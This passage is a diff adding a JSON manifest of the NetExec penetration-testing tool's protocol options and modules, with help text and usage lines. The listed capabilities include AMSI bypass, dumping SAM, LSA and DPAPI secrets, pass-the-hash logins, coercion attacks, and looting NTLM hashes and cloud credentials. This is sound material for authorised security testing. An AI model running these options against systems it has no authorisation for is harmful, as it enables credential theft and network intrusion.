+          "help": "Obfuscate PowerShell scripts",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--amsi-bypass"
+          ],
+          "help": "File with a custom AMSI bypass",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 1
+        },
+        {
+          "flags": [
+            "--clear-obfscripts"
+          ],
+          "help": "Clear all cached obfuscated PowerShell scripts",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--force-ps32"
+          ],
+          "help": "force PowerShell commands to run in a 32-bit process (may not apply to modules)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-encode"
+          ],
+          "help": "Do not encode the PowerShell command ran on target",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    },
+    "ssh": {
+      "source": "nxc/protocols/ssh/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "--key-file"
+          ],
+          "help": "Authenticate using the specified private key. Treats the password parameter as the key's passphrase.",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "SSH port",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--ssh-timeout"
+          ],
+          "help": "SSH connection timeout",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--sudo-check"
+          ],
+          "help": "Check user privilege with sudo",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--sudo-check-method"
+          ],
+          "help": "method to do with sudo check (mkfifo is non-stable, probably you need to execute once again if it failed)'",
+          "metavar": null,
+          "choices": [
+            "mkfifo",
+            "sudo-stdin"
+          ],
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--get-output-tries"
+          ],
+          "help": "Number of times with sudo command tries to get results",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--put-file"
+          ],
+          "help": "Put a local file into remote target, ex: whoami.txt /tmp/whoami.txt",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--get-file"
+          ],
+          "help": "Get a remote file, ex: /tmp/whoami.txt whoami.txt",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--codec"
+          ],
+          "help": "Set encoding used (codec) from the target's output. If errors are detected, run chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute again with --codec and the corresponding codec",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-output"
+          ],
+          "help": "do not retrieve command output",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-x"
+          ],
+          "help": "execute the specified command",
+          "metavar": "COMMAND",
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    },
+    "vnc": {
+      "source": "nxc/protocols/vnc/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "VNC port",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--vnc-timeout"
+          ],
+          "help": "VNC timeout on socket connection",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--vnc-sleep"
+          ],
+          "help": "VNC Sleep on socket connection to avoid rate limit",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--screenshot"
+          ],
+          "help": "Screenshot VNC if connection success",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--screentime"
+          ],
+          "help": "Time to wait for desktop image",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    },
+    "winrm": {
+      "source": "nxc/protocols/winrm/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "-H",
+            "--hash"
+          ],
+          "help": "NTLM hash(es) or file(s) containing NTLM hashes",
+          "metavar": "HASH",
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "WinRM port - format: 'http-port https-port' (with space separated) or 'single-port' (http & https will use same port when given single port)",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--check-proto"
+          ],
+          "help": "Choose what protocol you want to check - format: 'http https' (with space separated) or 'single-protocol'",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--laps"
+          ],
+          "help": "LAPS authentication",
+          "metavar": "LAPS",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--http-timeout"
+          ],
+          "help": "HTTP timeout for WinRM connections",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "help": "domain to authenticate to",
+          "metavar": "DOMAIN",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--local-auth"
+          ],
+          "help": "authenticate locally to each target",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dump-method"
+          ],
+          "help": "Select shell type in hashes dump for sam or lsa",
+          "metavar": null,
+          "choices": [
+            "cmd",
+            "powershell"
+          ],
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--sam"
+          ],
+          "help": "dump SAM hashes from target systems",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--lsa"
+          ],
+          "help": "dump LSA secrets from target systems",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dpapi"
+          ],
+          "help": "dump DPAPI secrets from target systems, can dump cookies if you add 'cookies', will not dump SYSTEM dpapi if you add nosystem",
+          "metavar": null,
+          "choices": [
+            "cookies",
+            "nosystem"
+          ],
+          "nargs": "*"
+        },
+        {
+          "flags": [
+            "--mkfile"
+          ],
+          "help": "DPAPI option. File with masterkeys in form of {GUID}:SHA1",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--pvk"
+          ],
+          "help": "DPAPI option. File with domain backupkey",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dir"
+          ],
+          "help": "List the content of a path (default path: '%(const)s')",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--put-file"
+          ],
+          "help": "Put a local file into remote target, ex: whoami.txt \\\\Windows\\\\Temp\\\\whoami.txt",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--get-file"
+          ],
+          "help": "Get a remote file, ex: \\\\Windows\\\\Temp\\\\whoami.txt whoami.txt",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--codec"
+          ],
+          "help": "Set encoding used (codec) from the target's output. If errors are detected, run chcp.com at the target & map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute again with --codec and the corresponding codec",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-output"
+          ],
+          "help": "do not retrieve command output",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-x"
+          ],
+          "help": "execute the specified command",
+          "metavar": "COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-X"
+          ],
+          "help": "execute the specified PowerShell command",
+          "metavar": "PS_COMMAND",
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    },
+    "wmi": {
+      "source": "nxc/protocols/wmi/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "-H",
+            "--hash"
+          ],
+          "help": "NTLM hash(es) or file(s) containing NTLM hashes",
+          "metavar": "HASH",
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "WMI port (default: 135)",
+          "metavar": null,
+          "choices": [
+            135
+          ],
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--rpc-timeout"
+          ],
+          "help": "RPC/DCOM(WMI) connection timeout, default is %(default)s seconds",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "help": "Domain to authenticate to",
+          "metavar": "DOMAIN",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--local-auth"
+          ],
+          "help": "Authenticate locally to each target",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dpapi"
+          ],
+          "help": "dump DPAPI secrets from target systems, can dump cookies if you add 'cookies', will not dump SYSTEM dpapi if you add nosystem",
+          "metavar": null,
+          "choices": [
+            "cookies"
+          ],
+          "nargs": "*"
+        },
+        {
+          "flags": [
+            "--sccm"
+          ],
+          "help": "dump SCCM secrets from target systems",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--mkfile"
+          ],
+          "help": "DPAPI option. File with masterkeys in form of {GUID}:SHA1",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--pvk"
+          ],
+          "help": "DPAPI option. File with domain backupkey",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--list-snapshots"
+          ],
+          "help": "Lists the VSS snapshots (default: %(const)s)",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--wmi-query"
+          ],
+          "help": "Issues the specified WMI query",
+          "metavar": "QUERY",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--wmi-namespace"
+          ],
+          "help": "WMI Namespace (default: %(default)s)",
+          "metavar": "NAMESPACE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-output"
+          ],
+          "help": "do not retrieve command output",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-x"
+          ],
+          "help": "Creates a new cmd process and executes the specified command with output",
+          "metavar": "COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-X"
+          ],
+          "help": "Creates a new PowerShell process and executes the specified command with output",
+          "metavar": "COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--exec-method"
+          ],
+          "help": "method to execute the command. (default: wmiexec). [wmiexec (win32_process + StdRegProv)]: get command results over registry instead of using smb connection. [wmiexec-event (T1546.003)]: this method is not very stable, highly recommend use this method in single host, using on multiple hosts may crash (just try again if it crashed).",
+          "metavar": null,
+          "choices": [
+            "wmiexec",
+            "wmiexec-event"
+          ],
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--exec-timeout"
+          ],
+          "help": "Set timeout (in seconds) when executing a command, minimum 5 seconds is recommended. Default: %(default)s",
+          "metavar": "exec_timeout",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--codec"
+          ],
+          "help": "Set encoding used (codec) from the target's output (default: utf-8). If errors are detected, run chcp.com at the target & map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute again with --codec and the corresponding codec",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    }
+  },
+  "modules": [
+    {
+      "source": "nxc/modules/adcs.py",
+      "name": "adcs",
+      "description": "Find PKI Enrollment Services in Active Directory and Certificate Templates Names",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "SERVER             PKI Enrollment Server to enumerate templates for. Default is None, use CN name\nBASE_DN            The base domain name for the LDAP query"
+    },
+    {
+      "source": "nxc/modules/add-computer.py",
+      "name": "add-computer",
+      "description": "Adds or deletes a domain computer via SAMR (SMB) or LDAP",
+      "supported_protocols": [
+        "smb",
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "add-computer: Adds, deletes, or changes the password of a domain computer account.\nUses SAMR when invoked with nxc smb.\n\nNAME        Computer name (required). Trailing '$' is added automatically.\nPASSWORD    Computer password (required for add/changepw).\nDELETE      Set to delete the computer account.\nCHANGEPW    Set to change an existing computer's password.\n\nUsage (same syntax for ldap):\n    nxc smb  $DC-IP -u Username -p Password -M add-computer -o NAME=\"BADPC\" PASSWORD=\"Password1\"\n    nxc smb  $DC-IP -u Username -p Password -M add-computer -o NAME=\"BADPC\" DELETE=True\n    nxc smb  $DC-IP -u Username -p Password -M add-computer -o NAME=\"BADPC\" PASSWORD=\"Password2\" CHANGEPW=True"
+    },
+    {
+      "source": "nxc/modules/aws-credentials.py",
+      "name": "aws-credentials",
+      "description": "Search for aws credentials files.",
+      "supported_protocols": [
+        "ssh",
+        "smb",
+        "winrm"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "SEARCH_PATH_LINUX       Linux location where to search for aws credentials related files\n                        Default: \"'/home/' '/tmp/'\"\n\nSEARCH_PATH_WIN         Windows locations where to search for aws credentials related files\n                        Default: \"'C:\\\\Users\\\\', 'C:\\\\ProgramData\\\\AWSCLI\\\\', 'C:\\\\Temp\\\\'\""
+    },
+    {
+      "source": "nxc/modules/backup_operator.py",
+      "name": "backup_operator",
+      "description": "Exploit user in backup operator group to dump NTDS @mpgn_x64",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "NO OPTIONS"
+    },
+    {
+      "source": "nxc/modules/badsuccessor.py",
+      "name": "badsuccessor",
+      "description": "Check if vulnerable to bad successor attack (DMSA)",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/bitlocker.py",
+      "name": "bitlocker",
+      "description": "Enumerating BitLocker Status on target(s) If it is enabled or disabled.",
+      "supported_protocols": [
+        "smb",
+        "wmi"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "USAGE:\n\nNetExec smb <IP> -u <username> -p <password> -M bitlocker\nNetExec wmi <IP> -u <username> -p <password> -M bitlocker (Better option to use on real life.)"
+    },
+    {
+      "source": "nxc/modules/certipy-find.py",
+      "name": "certipy-find",
+      "description": "certipy find command with options to export the result to text/csv/json. Default: Show only vulnerable templates",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "VULN        Show only vulnerable configurations (Default: True)\nENABLED     Show only enabled templates\n\nExport options:\nTEXT        Export results to a plain text file\nCSV         Export results to a CSV file\nJSON        Export results to a JSON file"
+    },
+    {
+      "source": "nxc/modules/change-password.py",
+      "name": "change-password",
+      "description": "Change or reset user passwords via various protocols",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Required (one of):\nNEWPASS     The new password of the user.\nNEWNTHASH   The new NT hash of the user.\n\nOptional:\nUSER        The user account if the target is not the current user.\n\nExamples\n--------\nIf STATUS_PASSWORD_MUST_CHANGE, STATUS_PASSWORD_EXPIRED or STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT (Change password for current user)\n    netexec smb <DC_IP> -u username -p oldpass -M change-password -o NEWNTHASH='nthash'\n    netexec smb <DC_IP> -u username -H oldnthash -M change-password -o NEWPASS='newpass'\n\nIf want to change other user's password (with forcechangepassword priv or admin rights)\n    netexec smb <DC_IP> -u username -p password -M change-password -o USER='target_user' NEWPASS='target_user_newpass'\n    netexec smb <DC_IP> -u username -p password -M change-password -o USER='target_user' NEWNTHASH='target_user_newnthash'"
+    },
+    {
+      "source": "nxc/modules/coerce_plus.py",
+      "name": "coerce_plus",
+      "description": "Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "LISTENER       LISTENER for exploitation (default: 127.0.0.1)\nALWAYS         Always continue to all exploit (default: False)\nMETHOD         Exploit method (Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven, All   default: All)\nM              Alias for METHOD\nL              Alias for LISTENER"
+    },
+    {
+      "source": "nxc/modules/daclread.py",
+      "name": "daclread",
+      "description": "Read and backup the Discretionary Access Control List of objects. Be careful, this module cannot read the DACLS recursively, see more explanation in the options.",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Be careful, this module cannot read the DACLS recursively.\nFor example, if an object has particular rights because it belongs to a group, the module will not be able to see it directly, you have to check the group rights manually.\n\nTARGET          The objects that we want to read or backup the DACLs, specified by its SamAccountName\nTARGET_DN       The object that we want to read or backup the DACL, specified by its DN (useful to target the domain itself)\nPRINCIPAL       The trustee that we want to filter on\nACTION          The action to realise on the DACL (read, backup)\nACE_TYPE        The type of ACE to read (Allowed or Denied)\nRIGHTS          An interesting right to filter on ('FullControl', 'ResetPassword', 'WriteMembers', 'DCSync')\nRIGHTS_GUID     A right GUID that specify a particular rights to filter on\n\nBased on the work of @_nwodtuhs and @BlWasp_."
+    },
+    {
+      "source": "nxc/modules/dfscoerce.py",
+      "name": "dfscoerce",
+      "description": "[REMOVED] Module to check if the DC is vulnerable to DFSCoerce, credit to @filip_dragovic/@Wh04m1001 and @topotam",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "LISTENER    Listener Address (defaults to 127.0.0.1)"
+    },
+    {
+      "source": "nxc/modules/dns-nonsecure.py",
+      "name": "dns-nonsecure",
+      "description": "Detects DNS zones that allow nonsecure dynamic updates",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/dpapi_hash.py",
+      "name": "dpapi_hash",
+      "description": "Remotely dump Dpapi hash based on masterkeys",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "OUTPUTFILE       Output file to write hashes"
+    },
+    {
+      "source": "nxc/modules/drop-library-ms.py",
+      "name": "drop-library-ms",
+      "description": "Creates and uploads an arbitrary .library-ms on writable shares, leveraging CVE-2025-24054 for looting NTLMv2 hash",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "SERVER      Attacker machine\nNAME        File name\nIGNORE      Specific shares to ignore (comma separated, default: C$,ADMIN$,NETLOGON,SYSVOL)\nCLEANUP     Cleaning option (True or False)"
+    },
+    {
+      "source": "nxc/modules/drop-sc.py",
+      "name": "drop-sc",
+      "description": "Drop a searchConnector-ms file on each writable share",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\nhttps://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\nModule by @zblurx\nURL         URL in the searchConnector-ms file, default https://rickroll\nCLEANUP     Cleanup (choices: True or False)\nSHARE       Specify a share to target\nFILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it's automatically added), default is \"Documents\""
+    },
+    {
+      "source": "nxc/modules/dump-computers.py",
+      "name": "dump-computers",
+      "description": "Dumps FQDN and OS of all computers in the domain",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "TYPE        Only dump NETBIOS or FQDN instead of 'FQDN (OS Version)'\nOUTPUT      Output to file in addition to printing to console\n\nExamples\n--------\nnetexec ldap $DC-IP -u $username -p $password -M dump-computers\nnetexec ldap $DC-IP -u $username -p $password -M dump-computers -o TYPE=netbios\nnetexec ldap $DC-IP -u $username -p $password -M dump-computers -o TYPE=fqdn\nnetexec ldap $DC-IP -u $username -p $password -M dump-computers -o TYPE=netbios OUTPUT=<location>"
+    },
+    {
+      "source": "nxc/modules/efsr_spray.py",
+      "name": "efsr_spray",
+      "description": "[REMOVED] Tries to activate the EFSR service by creating a file with the encryption attribute on some available share.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "FILE_NAME      Name of the file which will be tried to create and afterwards delete\nSHARE_NAME     If set, ONLY this share will be used\nEXCLUDED_SHARES List of share names which will not be used, separated by comma"
+    },
+    {
+      "source": "nxc/modules/empire_exec.py",
+      "name": "empire_exec",
+      "description": "Uses Empire's RESTful API to generate a launcher for the specified listener and executes it",
+      "supported_protocols": [
+        "smb",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "LISTENER        Listener name to generate the launcher for\nSSL             True if the listener is using SSL/TLS\nOBFUSCATE       True if you want to use the built-in Obfuscation (that calls Invoke-Obfuscate)\nOBFUSCATE_CMD   Override Invoke-Obfuscation command (Default is \"Token,All,1\" and is picked up by Defender)"
+    },
+    {
+      "source": "nxc/modules/enable_cmdshell.py",
+      "name": "enable_cmdshell",
+      "description": "Enable or disable xp_cmdshell in MSSQL Server",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "ACTION      enable or disable xp_cmdshell\n\nExamples\n--------\nnetexec mssql $TARGET -u $username -p $password -M enable_cmdshell -o ACTION=enable\nnetexec mssql $TARGET -u $username -p $password -M enable_cmdshell -o ACTION=disable"
+    },
+    {
+      "source": "nxc/modules/entra-id.py",
+      "name": "entra-id",
+      "description": "Find the Entra ID sync server",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available."
+    },
+    {
+      "source": "nxc/modules/enum_av.py",
+      "name": "enum_av",
+      "description": "Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "        "
+    },
+    {
+      "source": "nxc/modules/enum_ca.py",
+      "name": "enum_ca",
+      "description": "Anonymously uses RPC endpoints to hunt for ADCS CAs",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/enum_cve.py",
+      "name": "enum_cve",
+      "description": "Enumerate common (useful) CVEs by querying the registry for the OS version and UBR.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Be aware that these checks solely rely on the OS version and UBR reported in the registry,\nand do not check for the actual presence of the vulnerable components or mitigations.\nTest the attack yourself to verify the host is actually vulnerable.\n\nCurrently supported CVEs:\n- CVE-2025-33073 (NTLM Reflection)\n- CVE-2025-58726 (Ghost SPN)\n- CVE-2025-54918 (NTLM MIC Bypass)\n- CVE-2025-53779 (BadSuccessor)\n- CVE-2024-49019 (EKUwu / ESC15)\n- CVE-2026-54121 (Certighost)\n- CVE-2026-27912 (ResetNightmare)\n\nCVE             Filter for specific CVE number (default: All)\nEXPLOITATION    Also provide sources for exploitation details (default: False)"
+    },
+    {
+      "source": "nxc/modules/enum_dns.py",
+      "name": "enum_dns",
+      "description": "Uses WMI to dump DNS from an AD DNS Server",
+      "supported_protocols": [
+        "smb",
+        "wmi"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "DOMAIN  Domain to enumerate DNS for. Defaults to all zones."
+    },
+    {
+      "source": "nxc/modules/enum_impersonate.py",
+      "name": "enum_impersonate",
+      "description": "Enumerate users with impersonation privileges",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/enum_interfaces.py",
+      "name": "enum_interfaces",
+      "description": "Retrieve the list of network interfaces info (Name, IP Address, Subnet Mask, Default Gateway) from remote Windows registry (formerly --interfaces)",
+      "supported_protocols": [
+        "smb"
+      ],
+      "opsec_safe": false,
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/enum_links.py",
+      "name": "enum_links",
+      "description": "Enumerate linked SQL Servers and their login configurations.",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/enum_logins.py",
+      "name": "enum_logins",
+      "description": "Enumerate SQL Server logins (SQL, Domain, Local users)",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/enum_trusts.py",
+      "name": "enum_trusts",
+      "description": "[REMOVED] Extract all Trust Relationships, Trusting Direction, and Trust Transitivity",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/eventlog_creds.py",
+      "name": "eventlog_creds",
+      "description": "Extracting Credentials From Windows Logs (Event ID: 4688 and SYSMON)",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "METHOD         EventLog method (Execute or RPCCALL), default: execute\nM              Alias for METHOD\nLIMIT          Limit of the number of records to be fetched, default: unlimited\nL              Alias for LIMIT"
+    },
+    {
+      "source": "nxc/modules/example_module.py",
+      "name": "example module",
+      "description": "I do something",
+      "supported_protocols": [],
+      "callbacks": [
+        "on_login",
+        "on_admin_login"
+      ],
+      "options_documentation": "Required.\nModule options get parsed here. Additionally, put the modules usage here as well"
+    },
+    {
+      "source": "nxc/modules/exec_on_link.py",
+      "name": "exec_on_link",
+      "description": "Execute commands on a SQL Server linked server",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "LINKED_SERVER: The name of the linked server to execute the command on.\nCOMMAND: The command to execute on the linked server."
+    },
+    {
+      "source": "nxc/modules/find-computer.py",
+      "name": "find-computer",
+      "description": "Finds computers in the domain via the provided text",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "TEXT    Search TEXT in the operating system or name of the computer.\n\nExamples:\nnxc ldap $DC-IP -u Username -p Password -M find-computer -o TEXT=\"server\"\nnxc ldap $DC-IP -u Username -p Password -M find-computer -o TEXT=\"SQL\""
+    },
+    {
+      "source": "nxc/modules/firefox.py",
+      "name": "firefox",
+      "description": "[REMOVED] Dump credentials from Firefox",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "[REMOVED] use the --dpapi flag instead of the module firefox.\n\nCOOKIES    Get also Firefox cookies"
+    },
+    {
+      "source": "nxc/modules/get-desc-users.py",
+      "name": "get-desc-users",
+      "description": "Get description of the users. May contain password",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "FILTER    Apply the FILTER (grep-like) (default: '')\nPASSWORDPOLICY    Is the windows password policy enabled ? (default: False)\nMINLENGTH    Minimum password length to match, only used if PASSWORDPOLICY is True (default: 6)"
+    },
+    {
+      "source": "nxc/modules/get-info-users.py",
+      "name": "get-info-users",
+      "description": "Get the info field of all users. May contain password",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "FILTER    Apply the FILTER (grep-like) (default: '')"
+    },
+    {
+      "source": "nxc/modules/get-network.py",
+      "name": "get-network",
+      "description": "Query all DNS records with the corresponding IP from the domain.",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "ALL           Get DNS and IP (default: false)\nONLY_HOSTS    Get DNS only (no ip) (default: false)"
+    },
+    {
+      "source": "nxc/modules/get-scriptpath.py",
+      "name": "get-scriptpath",
+      "description": "Get the scriptPath attribute of all users.",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "FILTER        Apply the FILTER (grep-like) (default: '')\nOUTPUTFILE    Path to a file to save the results (default: None)"
+    },
+    {
+      "source": "nxc/modules/get-unixUserPassword.py",
+      "name": "get-unixUserPassword",
+      "description": "Get unixUserPassword attribute from all users in ldap",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "        "
+    },
+    {
+      "source": "nxc/modules/get-userPassword.py",
+      "name": "get-userPassword",
+      "description": "Get userPassword attribute from all users in ldap",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "        "
+    },
+    {
+      "source": "nxc/modules/get_netconnections.py",
+      "name": "get_netconnections",
+      "description": "Uses WMI to query network connections.",
+      "supported_protocols": [
+        "smb",
+        "wmi"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/gpp_autologin.py",
+      "name": "gpp_autologin",
+      "description": "Searches the domain controller for registry.xml to find autologon information and returns the username and password.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available."
+    },
+    {
+      "source": "nxc/modules/gpp_password.py",
+      "name": "gpp_password",
+      "description": "Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
